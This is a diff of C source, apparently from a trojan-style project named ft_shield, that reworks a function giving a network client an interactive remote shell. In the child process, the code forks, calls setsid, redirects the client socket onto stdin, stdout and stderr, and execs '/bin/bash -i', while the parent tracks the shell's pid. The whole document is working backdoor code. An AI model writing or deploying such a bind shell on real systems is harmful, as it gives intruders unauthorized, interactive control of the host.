@@ -1,25 +1,35 @@
 #include "ft_shield.h"
 
-void	*shell_function(void *data)
+void	*shell_function(t_server *server, int index)
 {
-	const int	client_fd = (int)(long)data;
-	// int			status;
+	const int	client_fd = server->clients[index].fd;
 	pid_t		pid;
 
-	// send(client_fd, REMOTE_OPENED, sizeof(REMOTE_OPENED), 0);
+	dprintf(2, "clientfd: %d\n", client_fd);
+
+	// server->nbr_clients--;
+	memset(&server->clients[index], 0, sizeof(t_client));
+
 	pid = fork();
-	if (pid == 0)
-	{
-		char *args[] = {"/bin/bash", "-i", NULL};
+	if (pid < 0) {
+		perror("fork");
+	}
+	else if (pid == 0) {
+		setsid();
+
+		close(server->fd);
 		dup2(client_fd, STDIN_FILENO);
 		dup2(client_fd, STDERR_FILENO);
 		dup2(client_fd, STDOUT_FILENO);
 		close(client_fd);
+
+		char *args[] = {"/bin/bash", "-i", NULL};
 		execv("/bin/bash", args);
 		exit(1);
 	}
-	close(client_fd);
-
-	// waitpid(-1, &status, 0);
+	else if (pid > 0) {
+		server->pid_shells[index] = pid;
+		close(client_fd);
+	}
 	return (NULL);
 }
